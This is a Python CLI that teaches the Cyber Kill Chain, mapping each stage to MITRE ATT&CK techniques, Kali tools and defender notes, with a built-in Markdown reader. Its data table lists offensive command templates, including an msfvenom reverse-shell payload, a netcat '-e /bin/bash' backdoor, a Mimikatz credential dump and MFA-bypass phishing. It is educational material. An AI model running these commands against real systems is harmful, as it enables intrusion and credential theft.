"""Interactive CLI teaching the Lockheed Martin Cyber Kill Chain.

This script uses the Cement framework for command routing and ANSI escape
codes for simple coloring. It highlights each stage of the Kill Chain
alongside relevant Kali Linux tooling and methodology notes, and embeds a
Markdown reader for the MONARCH ops docs.
"""
from __future__ import annotations

from cement import App, Controller, ex
import os
import shlex
import shutil
import subprocess
import sys
from pathlib import Path

# ANSI color codes for simple styling.
BOLD = "\033[1m"
CYAN = "\033[36m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
RED = "\033[31m"
RESET = "\033[0m"

PROJECT_ROOT = Path(__file__).resolve().parent
DEFAULT_DOC_ROOT = PROJECT_ROOT / "ops_docs"

# Comprehensive Kill Chain data with MITRE ATT&CK alignment, tool commands, and defender notes.
kill_chain_data = [
    {
        "name": "Reconnaissance",
        "kill_chain_id": 1,
        "description": (
            "The planning phase where attackers research targets, identify vulnerabilities, and harvest information "
            "(email, IP ranges)."
        ),
        "methodology": (
            "Passive recon gathers data from public records, while active recon probes the network for live services."
        ),
        "mitre_attack": {
            "tactic": "TA0043",
            "techniques": [
                {"id": "T1593", "name": "Search Open Websites/Domains"},
                {"id": "T1595", "name": "Active Scanning"},
                {"id": "T1590", "name": "Gather Victim Network Information"},
            ],
        },
        "tools": [
            {
                "name": "theHarvester",
                "command": "theHarvester -d [domain] -l 500 -b google",
                "purpose": "Harvesting emails, names, and subdomains from OSINT sources.",
            },
            {
                "name": "Nmap",
                "command": "nmap -sV -T4 [target_ip]",
                "purpose": "Active service discovery and version detection.",
            },
            {
                "name": "Amass",
                "command": "amass enum -d [domain]",
                "purpose": "Comprehensive subdomain enumeration and attack surface mapping.",
            },
            {
                "name": "Recon-ng",
                "command": "recon-ng",
                "purpose": "Modular OSINT framework for structured reconnaissance.",
            },
        ],
        "defender_notes": "Monitor for scanning patterns, excessive DNS queries, and abnormal OSINT-driven targeting.",
    },
    {
        "name": "Weaponization",
        "kill_chain_id": 2,
        "description": "Coupling a remote access trojan with an exploit into a deliverable payload (e.g., an infected PDF or Office doc).",
        "methodology": "Attackers package malicious code into common file formats or create standalone executables.",
        "mitre_attack": {
            "tactic": "TA0042",
            "techniques": [
                {"id": "T1587", "name": "Develop Capabilities"},
                {"id": "T1588", "name": "Obtain Capabilities"},
            ],
        },
        "tools": [
            {
                "name": "msfvenom",
                "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[Port] -f exe",
                "purpose": "Generating standalone payloads and shellcode.",
            },
            {
                "name": "SET (Social-Engineer Toolkit)",
                "command": "sudo setoolkit",
                "purpose": "Automating the creation of malicious media and phishing templates.",
            },
            {
                "name": "Veil",
                "command": "veil",
                "purpose": "Generating payloads designed to evade signature-based defenses.",
            },
        ],
        "defender_notes": "Look for abnormal file creation, suspicious macro usage, and payload staging activity.",
    },
    {
        "name": "Delivery",
        "kill_chain_id": 3,
        "description": "The transmission of the weaponized payload to the victim (via email, web, or USB).",
        "methodology": "The delivery vector is chosen based on the victim's behavior discovered during Recon.",
        "mitre_attack": {
            "tactic": "TA0001",
            "techniques": [
                {"id": "T1566", "name": "Phishing"},
                {"id": "T1185", "name": "Man-in-the-Middle"},
                {"id": "T1557", "name": "Adversary-in-the-Middle"},
            ],
        },
        "tools": [
            {
                "name": "Evilginx2",
                "command": "sudo evilginx2",
                "purpose": "Transparent phishing proxy to capture credentials and session cookies, bypassing MFA.",
            },
            {
                "name": "Wifipumpkin3",
                "command": "sudo wifipumpkin3",
                "purpose": "Creating rogue access points to deliver payloads via fake Wi-Fi networks.",
            },
            {
                "name": "Gophish",
                "command": "gophish",
                "purpose": "Managing large-scale phishing campaigns and tracking user interaction.",
            },
        ],
        "defender_notes": "Email filtering, MFA enforcement, certificate validation, and wireless IDS reduce exposure.",
    },
    {
        "name": "Exploitation",
        "kill_chain_id": 4,
        "description": "The point where the malicious code executes on the victim's system, leveraging a software flaw.",
        "methodology": "Triggering the payload by exploiting known CVEs or misconfigurations.",
        "mitre_attack": {
            "tactic": "TA0002",
            "techniques": [
                {"id": "T1203", "name": "Exploitation for Client Execution"},
                {"id": "T1059", "name": "Command-Line Interface"},
            ],
        },
        "tools": [
            {
                "name": "Metasploit (msfconsole)",
                "command": "msfconsole -q -x 'use exploit/[name]; set RHOSTS [target]; run'",
                "purpose": "Executing remote and local exploits through a modular framework.",
            },
            {
                "name": "SQLmap",
                "command": "sqlmap -u '[URL]' --batch --dbs",
                "purpose": "Automated detection and exploitation of SQL injection vulnerabilities.",
            },
            {
                "name": "Searchsploit",
                "command": "searchsploit [service]",
                "purpose": "Locating known public exploits for discovered services.",
            },
        ],
        "defender_notes": "Patch management, WAFs, and exploit behavior monitoring are critical here.",
    },
    {
        "name": "Installation",
        "kill_chain_id": 5,
        "description": "Installing a persistent backdoor or foothold to survive reboots or credential changes.",
        "methodology": "Persistence mechanisms maintain access after initial exploitation.",
        "mitre_attack": {
            "tactic": "TA0003",
            "techniques": [
                {"id": "T1053", "name": "Scheduled Task/Job"},
                {"id": "T1547", "name": "Boot or Logon Autostart Execution"},
            ],
        },
        "tools": [
            {
                "name": "Empire",
                "command": "powershell-empire",
                "purpose": "Post-exploitation framework for PowerShell-based persistence.",
            },
            {
                "name": "Netcat (nc)",
                "command": "nc -lvp [port] -e /bin/bash",
                "purpose": "Lightweight listener and backdoor channel.",
            },
        ],
        "defender_notes": "Monitor autoruns, scheduled tasks, registry persistence, and unusual services.",
    },
    {
        "name": "Command & Control (C2)",
        "kill_chain_id": 6,
        "description": "Establishing communication between compromised hosts and attacker infrastructure.",
        "methodology": "Traffic is disguised as legitimate protocols to evade detection.",
        "mitre_attack": {
            "tactic": "TA0011",
            "techniques": [
                {"id": "T1071", "name": "Application Layer Protocol"},
                {"id": "T1090", "name": "Proxy"},
            ],
        },
        "tools": [
            {
                "name": "Sliver",
                "command": "sliver-server",
                "purpose": "Modern cross-platform C2 using mTLS, HTTP/2, or DNS.",
            },
            {
                "name": "Pwnat",
                "command": "pwnat -s",
                "purpose": "Maintaining C2 channels through NAT without port forwarding.",
            },
        ],
        "defender_notes": "Inspect encrypted traffic patterns, beacon timing, and DNS anomalies.",
    },
    {
        "name": "Actions on Objectives",
        "kill_chain_id": 7,
        "description": "Final phase where attackers accomplish their mission goals.",
        "methodology": "Includes credential theft, lateral movement, exfiltration, or destruction.",
        "mitre_attack": {
            "tactic": "TA0040",
            "techniques": [
                {"id": "T1003", "name": "OS Credential Dumping"},
                {"id": "T1048", "name": "Exfiltration Over Alternative Protocol"},
                {"id": "T1485", "name": "Data Destruction"},
            ],
        },
        "tools": [
            {
                "name": "PyExfil",
                "command": "python3 pyexfil.py",
                "purpose": "Covert data exfiltration via DNS, ICMP, or HTTP.",
            },
            {
                "name": "Mimikatz",
                "command": "mimikatz.exe \"privilege::debug\" \"lsadump::sam\"",
                "purpose": "Extracting plaintext credentials and password hashes from memory.",
            },
        ],
        "defender_notes": "Monitor credential access, lateral authentication spikes, and outbound data flows.",
    },
]


def clear_screen() -> None:
    """Clear the terminal screen across platforms."""
    os.system("cls" if os.name == "nt" else "clear")


def auto_resize_terminal(target_rows: int = 60, target_cols: int = 200) -> None:
    """Attempt to resize the terminal to a generous working area.

    Many terminals honor the CSI 8 escape code. If unsupported, the call is
    silently ignored so the app remains portable.
    """

    current = shutil.get_terminal_size(fallback=(80, 24))
    rows = max(current.lines, target_rows)
    cols = max(current.columns, target_cols)
    try:
        sys.stdout.write(f"\033[8;{rows};{cols}t")
        sys.stdout.flush()
    except Exception:
        # Non-fatal; proceed with the current terminal size.
        return


def collect_markdown_files(root: Path) -> list[Path]:
    """Return a sorted list of Markdown files beneath ``root``."""

    if not root.exists():
        return []

    return sorted(
        (path for path in root.rglob("*.md") if path.is_file()),
        key=lambda path: path.relative_to(root).as_posix().lower(),
    )


def page_text(content: str) -> None:
    """Page ``content`` using the user's preferred pager or a safe fallback."""

    pager_cmd = os.environ.get("PAGER", "less -R")
    try:
        cmd_parts = shlex.split(pager_cmd)
        subprocess.run(cmd_parts, input=content, text=True, check=False)
        return
    except FileNotFoundError:
        pass
    except Exception:
        # Fall back to inline display on any other subprocess error.
        pass

    # Inline fallback with basic scroll lock feel (prints then waits).
    print(content)
    input("Press Enter to return to the menu.")


def open_in_editor(editor: str, path: Path) -> None:
    """Launch ``editor`` (e.g., vim or nano) for ``path`` in blocking mode."""

    try:
        subprocess.run([editor, str(path)], check=False)
    except FileNotFoundError:
        print(f"{RED}{editor} is not installed or not on PATH.{RESET}")
        input("Press Enter to continue.")


def render_docs_menu(files: list[Path], root: Path) -> None:
    """Render the Markdown browser menu with a console-style dash."""

    header = f"{BOLD}{CYAN}╔════════════════════════════════════════════════════════════════════╗{RESET}"
    title = f"{BOLD}{CYAN}║   MONARCH Markdown Browser (root: {root}){RESET}"
    footer = f"{BOLD}{CYAN}╚════════════════════════════════════════════════════════════════════╝{RESET}"

    print(header)
    print(title)
    print(footer)

    if not files:
        print("No Markdown files found. Populate ops_docs/ with fetch_external_docs.py.")
        return

    for index, file in enumerate(files, start=1):
        print(f"{BOLD}{index:>3}.{RESET} {file.relative_to(root)}")
    print("\nCommands: <number> to page, 'vim <number>', 'nano <number>', 'b' to go back, 'q' to quit")


def browse_markdown(root: Path = DEFAULT_DOC_ROOT) -> None:
    """Interactive Markdown reader embedded in the dashboard."""

    files = collect_markdown_files(root)
    while True:
        clear_screen()
        render_docs_menu(files, root)
        if not files:
            input("Press Enter to return.")
            return

        choice = input("Select: ").strip()
        lowered = choice.lower()
        if lowered in {"q", "quit", "exit"}:
            sys.exit(0)
        if lowered in {"b", "back"}:
            return

        # Editor commands
        if lowered.startswith("vim ") or lowered.startswith("nano "):
            parts = lowered.split()
            if len(parts) == 2 and parts[1].isdigit():
                idx = int(parts[1]) - 1
                if 0 <= idx < len(files):
                    open_in_editor(parts[0], files[idx])
                    continue
            print(f"{RED}Provide a valid index after the editor command (e.g., 'vim 2').{RESET}")
            input("Press Enter to continue.")
            continue

        if not choice.isdigit():
            print(f"{RED}Enter a number, editor command, or 'b' to go back.{RESET}")
            input("Press Enter to continue.")
            continue

        idx = int(choice) - 1
        if idx < 0 or idx >= len(files):
            print(f"{RED}Selection out of range.{RESET}")
            input("Press Enter to continue.")
            continue

        try:
            content = files[idx].read_text(encoding="utf-8", errors="replace")
        except Exception as exc:
            print(f"{RED}Failed to read {files[idx]}: {exc}{RESET}")
            input("Press Enter to continue.")
            continue

        page_text(content)


def banner() -> str:
    """Return a retro dash-style banner inspired by MSFConsole."""

    lines = [
        f"{BOLD}{CYAN}╔═══════════════════════════════════════════════════════════════════════╗{RESET}",
        f"{BOLD}{CYAN}║  MONARCH :: KALI-KILLCHAIN EDUCATIONAL MANUAL                     v1.0 ║{RESET}",
        f"{BOLD}{CYAN}║  Inspired by MSFConsole / DOS dashboards — stay ethical, stay sharp.   ║{RESET}",
        f"{BOLD}{CYAN}╚═══════════════════════════════════════════════════════════════════════╝{RESET}",
    ]
    return "\n".join(lines)


def render_commands_help() -> str:
    """Return a help block describing available commands."""

    rows = [
        f"{BOLD}{CYAN}[ COMMANDS ]{RESET}",
        f" {GREEN}1-7{RESET}   View a Kill Chain stage",
        f" {GREEN}d{RESET}     Docs browser (Markdown)",
        f" {GREEN}h{RESET}     Toggle this help block",
        f" {GREEN}q{RESET}     Quit dashboard",
        "",
        f"{BOLD}{CYAN}[ DOCS BROWSER ]{RESET}",
        " number  Page a file (uses $PAGER)",
        " vim N  Open file N in vim",
        " nano N Open file N in nano",
        " b      Back to dashboard",
        " q      Quit",
    ]
    return "\n".join(rows)


def render_stage_table(stages: list[dict]) -> str:
    """Render stages as a two-column grid for a compact dash look."""

    col_width = 42
    padded = [
        f"{BOLD}{str(stage['kill_chain_id']).rjust(2)}{RESET} {CYAN}{stage['name']}{RESET}"
        for stage in stages
    ]
    left = padded[::2]
    right = padded[1::2]
    while len(left) > len(right):
        right.append("")
    lines: list[str] = []
    for lval, rval in zip(left, right):
        lines.append(f" {lval.ljust(col_width)}{rval}")
    return "\n".join(lines)


def render_stage(stage: dict) -> None:
    """Render the selected Kill Chain stage details."""

    clear_screen()
    print(f"{BOLD}{CYAN}{stage['kill_chain_id']}. {stage['name']}{RESET}\n")
    print(f"{YELLOW}Description:{RESET} {stage['description']}\n")
    print(f"{YELLOW}Methodology:{RESET} {stage['methodology']}\n")

    mitre = stage.get("mitre_attack", {})
    if mitre:
        print(f"{YELLOW}MITRE ATT&CK Tactic:{RESET} {mitre.get('tactic', 'N/A')}")
        techniques = mitre.get("techniques", [])
        if techniques:
            for tech in techniques:
                print(f"  • {GREEN}{tech['id']}{RESET}: {tech['name']}")
        print()

    tools = stage.get("tools", [])
    if tools:
        print(f"{YELLOW}Tools:{RESET}")
        for tool in tools:
            print(f"  • {GREEN}{tool['name']}{RESET}")
            print(f"    {YELLOW}Command:{RESET} {tool['command']}")
            print(f"    {YELLOW}Purpose:{RESET} {tool['purpose']}")
        print()

    defender_notes = stage.get("defender_notes")
    if defender_notes:
        print(f"{YELLOW}Defender Notes:{RESET} {defender_notes}\n")

    input("Press Enter to return to menu.")


class KillChainController(Controller):
    class Meta:
        label = "base"
        help = "KALI-KILLCHAIN EDUCATIONAL MANUAL"

    @ex(help="Launch the interactive Kill Chain tutorial")
    def default(self) -> None:
        stages = sorted(kill_chain_data, key=lambda item: item["kill_chain_id"])
        show_help = True
        auto_resize_terminal()
        try:
            while True:
                clear_screen()
                print(banner())
                print()
                print(render_stage_table(stages))
                print()
                if show_help:
                    print(render_commands_help())
                    print()
                prompt = f"{BOLD}{CYAN}monarch{RESET} > "
                choice = input(prompt).strip().lower()

                if choice in {"q", "quit", "exit"}:
                    break
                if choice in {"h", "help"}:
                    show_help = not show_help
                    continue
                if choice in {"d", "docs", "doc"}:
                    browse_markdown(DEFAULT_DOC_ROOT)
                    continue
                if not choice:
                    continue
                if not choice.isdigit():
                    print(f"{RED}Please enter a valid number, 'd' for docs, or 'q' to quit.{RESET}")
                    input("Press Enter to continue.")
                    continue

                index = int(choice) - 1
                if index < 0 or index >= len(stages):
                    print(f"{RED}That selection is out of range.{RESET}")
                    input("Press Enter to continue.")
                    continue

                render_stage(stages[index])
        except KeyboardInterrupt:
            pass
        finally:
            clear_screen()
            print("Goodbye! Keep learning and stay safe.")


class KillChainApp(App):
    class Meta:
        label = "killchain"
        base_controller = "base"
        handlers = [KillChainController]
        exit_on_close = True


def run_app() -> None:
    with KillChainApp() as app:
        app.run()


if __name__ == "__main__":
    run_app()
